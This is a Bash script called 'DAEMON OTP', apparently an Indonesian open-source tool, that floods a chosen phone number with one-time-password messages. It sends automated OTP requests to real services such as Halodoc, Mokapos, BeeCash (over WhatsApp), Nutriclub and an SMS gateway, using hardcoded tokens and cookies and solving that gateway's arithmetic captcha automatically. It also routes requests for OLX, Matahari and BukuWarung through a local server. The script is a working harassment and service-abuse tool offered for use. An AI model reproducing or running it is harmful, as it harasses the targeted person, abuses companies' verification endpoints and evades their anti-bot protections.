#!/bin/bash

# author : polygon
# github : Bayu12345677

# project : open source

# jika kalian pengen nambahin sesuatu silakan lakukan pull request
# dan masukan nama kalian di

#####################
#    contribusi     #
#####################
# ~ speedrun        #
# ~		    #
# ~		    #
#####################


# plugins bash moderen
. lib/moduler.sh
# depencies
Bash.import: util/io.class util/IO.FUNC util/IO.TYPE
Bash.import: text_display/colorama util/operator
Bash.import: text_display/IO.ECHO

# warna (colors)
bi=$(mode.bold: biru)    cy=$(mode.bold: cyan)
ij=$(mode.bold: hijau)  hi=$(mode.normal: hitam)
me=$(mode.bold: merah)  un=$(mode.bold: ungu)
ku=$(mode.bold: kuning) pu=$(mode.bold: putih)
m=$(mode.bold: pink)    st=$(default.color)

# package
var::array: depencies = { "tor" "figlet" "toilet" "curl" "jq" }

# scann package
for __package__ in "${depencies[@]}"; do
	command -v "$__package__" &> /dev/null || {
		apt install $__package__ -y &>/dev/null || {
			println_err " cannot install ${__package__}"; exit 23
		};
	};
done

# cek server
__name__=$(curl -sL http://127.0.0.1:8000)

if [[ "$__name__" == "online" ]]; then
	dummy=
else
	println_info " the server is not active please enter the server first"
	println_info " (tolong nyalakan server terlebih dahulu)"
	println_info " by opening a new session and typing the following command (python server.py)"
	println_info " dengan cara membuka sessions baru dan ketikan perintah berikut (python server.py)"
	exit 2
fi

# class spam
class otp; {
	public: app = olx
	public: app = matahari
	public: app = buku
	public: app = payfaz
	public: app = harvest
	public: app = wa
	public: app = free
	public: app = moka
	public: app = halodoc
	public: app = nutri
	# object
	def: otp::olx(){
		global: no = "$1";
		req=$(curl -sL "http://127.0.0.1:8000/api/olx?phone=${no}")

		if [[ ! -z $(echo "$req" | grep -o "berhasil") ]]; then
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
		else
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
		fi
	};

	def: otp::matahari(){
		global: no = "$1"
		req=$(curl -sL "http://127.0.0.1:8000/api/matahari?phone=${no}")

		if [[ ! -z $(echo "$req" | grep -o "berhasil") ]]; then
		   Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
		else
		   Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
		fi
	};

	def: otp::harvest(){
		global: no = "$1"
		req=$(curl -sL "http://127.0.0.1:8000/api/harvest?phone=${no}")

		if [[ ! -z $(echo "$req" | grep -o "berhasil") ]]; then
		   Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
	    else
		   Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
		fi
	}

	def: otp::payfaz(){
		global: no = "$1"
		req=$(curl -sL "http://127.0.0.1:5000/api/payfaz?phone=${no}")

		if [[ ! -z $(echo "$req" | grep -o "berhasil") ]]; then
           Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
        else
           Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
        fi
	}

	def: otp::wa(){
		global: no = "$1"
		req=$(curl -sL -X POST -H "Content-Type:application/json" -d '{"operationName":"SendOtpMutation","variables":{"input":{"mobile":"'$no'","purpose":"AUTH","mode":"WHATSAPP","skipBusinessCreation":true},"key":"a55e5351-d70a-44a5-b219-908b58a90c75"},"query":"mutation SendOtpMutation($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    success\n    __typename\n  }\n}\n"}' "https://api.beecash.io/graphql")

		if [[ ! -z $(echo "$req" | grep -o "true") ]]; then
           Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
        else
           Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
        fi
	};

	def: otp::buku(){
		global: no = "$1"
		req=$(curl -sL "http://127.0.0.1:8000/api/bukuwarung?phone=${no}")

		if [[ ! -z $(echo "$req" | grep -o "berhasil") ]]; then
		   Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
		else
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
		fi
	}

	def: otp::free(){
		global: no = "$1"
		bypas=$(curl -sL -A "Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36" http://sms.payuterus.biz/alpha/?a=keluar --insecure --compressed)
		token=$(
				echo "$bypas" | \
				grep -o "<span>.*" | sed 's;[<span></span> =];'';g'; @ parse capcha nya
			  )
	    bypas=$(
	    		echo "$bypas" | \
				grep -o "value=\"[0-9].*\"" | sed -e 's;";'';g' | cut -d '=' -f2; @ ambil key nya
	    		)
		var capcha : $((${token})); @ disini kita tahu bahwa capcha nya payu terus itu adalah artimatic ya itu penjumlahan kalian bisa menggunakan let atau symbol expresion
		var key : "${bypas}"

		req=$(curl -sL -X POST -A "Mozilla/5.0 (Linux; Android $(shuf -i 5-9 -n 1); TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36" --data-urlencode "nohp=${no}" --data "pesan=123456789101112131415" --data "captcha=${capcha}" --data "key=${key}" https://alpha.payuterus.biz/send.php --insecure --compressed); @ btw data pesan nya harus 15 karakter
		if [[ -z "$token" ]]; then
			println_info " gagal mengambil token"
		fi

		if (ambil: req in "SMS Gratis Telah Dikirim"); then
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
		else
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
		fi
	}

	def: otp::moka(){
		 global: no = "$1";

		declare hed=(
			"authorization: undefined"
		)
		 req=$(
		 	curl -sL -X POST -H "${hed[0]}" -H "content-type:application/json;charset=UTF-8" -A "Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36" -d '{"phone_number":"'"$no"'"}' https://service.mokapos.com/account/v1/verification/phone/send
		 )

		 if (ambil: req in error); then
		 	Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
		 else
		 	Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
		 fi
	};

	def: otp::halodoc(){
		global: no = "$1";

		declare head=(
			"x-xsrf-token:2FD59AFD6D6AD282A148FF4071B7BBDA2467EC46C492938B367DC01773D1433E0EEA3CC681998DB5A5DB51A56E5EB16706DA"
			"sec-fetch-site:same-origin"
			"origin:https://www.halodoc.com"
			"content-type:application/json"
			"sec-fetch-dest:empty"
		); req=$(curl -sL -X POST -A "Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36" -H "${head[0]}" -H "${head[2]}" -H "${head[1]}" -H "${head[3]}" -H "${head[4]}" -H "cookie:_ga=GA1.2.633407904.1596796977" -H "cookie:_gid=GA1.2.1023133289.1596796977" -H "cookie:_fbp=fb.1.1596796980277.2079016466" -H "cookie:XSRF-TOKEN=2FD59AFD6D6AD282A148FF4071B7BBDA2467EC46C492938B367DC01773D1433E0EEA3CC681998DB5A5DB51A56E5EB16706DA" -H "cookie:AF_BANNERS_SESSION_ID=1596804576983" -H "cookie:_gat_UA-89605346-3=1" -d '{"phone_number":"'"$no"'"}' "https://www.halodoc.com/api/v1/users/authentication/otp/requests" --insecure --compressed)

		# validasi otp
		if (ambil: req in "false"); then
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
		else
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
		fi
	};

	def: otp::nutri(){
		global: no = "$1"
		req=$(curl -sL -X POST "https://www.nutriclub.co.id/otp/?phone=0${no}&old_phone=0${no}" --insecure -A "Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36" --compressed)

		# validasi otp
		if (ambil: req in "berhasil dikirim"); then
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mberhasil ${ij}√\e[0m"
		else
			Tulis.strN "${ku}[${me}•${ij}•${ku}]${pu} spam ${un}->${st} ${no} \e[1;41;97mgagal ${me}X\e[0m"
		fi
	};
};

# method class
class.new: otp spam

# chall
# spam.object

# banner
def: banner(){
	Tulis.strN "${cy}";toilet -f slant -F border "DAEMON OTP"; Tulis.strN "${st}"
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} spam otp version   \e[1;41;97m$(cat files/versi.txt)${st}"
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} maintance server ${me}: \e[1;41;97mGithub${st}"
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} maintance status ${me}: \e[1;42;97maktivate${st}"
	Tulis.strN "${ku}======================================================================${st}"
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} server spam ${me}: ${ku}Flask${st}"
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} python vers ${me}: ${ku}3.10${st}"
	Tulis.strN "${ku}======================================================================${st}"
	Tulis.strN "${cy}[${me}•${ku}•${ij}•${cy}]${st} Author : polygon"
	Tulis.strN "${cy}[${me}•${ku}•${ij}•${cy}]${st} github : Bayu12345677"
	Tulis.strN "${ku}----------------------------------------------------------------------${st}"
}

# menu utama

def: main(){
	stty sane
	shopt -s checkwinsize
	clear; banner; echo
	Tulis.strN "${ku}[${me}•${ij}•${cy}•${ku}]${pu} warning : this source is only the support code of the country indonesia"
	Tulis.str "${cy}(${me}•${ku}•${ij}•${cy})${st} target (62xxxx) : "
	read target; echo

	# cek input
	if [[ -z "$target" ]]; then
		Tulis.strN "${ku}[${me}!${ku}]${st} Input not found"
	fi; (:)
		# validasi nomer
		if [[ "${target:0:3}" == "+62" ]]; then
			target=${target:3:15}
		elif [[ "${target:0:2}" == "62" ]]; then
			target=${target:2:15}
		elif [[ "${target:0:2}" == "08" ]]; then
			target=${target:1:15}
		fi;
			# call class
			spam.olx "${target}"
			spam.matahari "${target}"
			spam.harvest "${target}"
			spam.payfaz "${target}"
			spam.wa "${target}"
			spam.buku "${target}"
			spam.free "62${target}"
			spam.moka "+62${target}"
			spam.halodoc "+62${target}"
			spam.nutri "0${target}"; echo
			__e__="process has been completed"; throw; echo
};

def: maintance(){
	Tulis.str "${cy}";figlet -f slant "Script update";Tulis.str "${st}"
	echo
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} Script this version has been a long time please immediately update this script"
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} update to $(curl -sL \"https://raw.githubusercontent.com/Bayu12345677/SpamOtp/main/files/vers.txt\")"
	Tulis.strN "${ku}------------------------------------------------------------------------"
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} join grup : https://chat.whatsapp.com/GxUnM7xAJyU7A0YYcjpnL0"
	Tulis.strN "${ku}[${me}•${ij}•${ku}]${st} command to update : make update if it has (cd .)"
	echo
}
# fitur maintance 
var git : "https://raw.githubusercontent.com/Bayu12345677/SpamOtp/main/files/vers.txt"

if [[ "$(cat files/vers.txt)" == "$(curl -sL ${git})" ]]; then
{
	var::command this = IO.func
}; {
	$this.NAME main && { if [[ "${__FUNCNAME__}" == "main" ]]; then main; else true; fi; }
};
	else
		maintance
fi
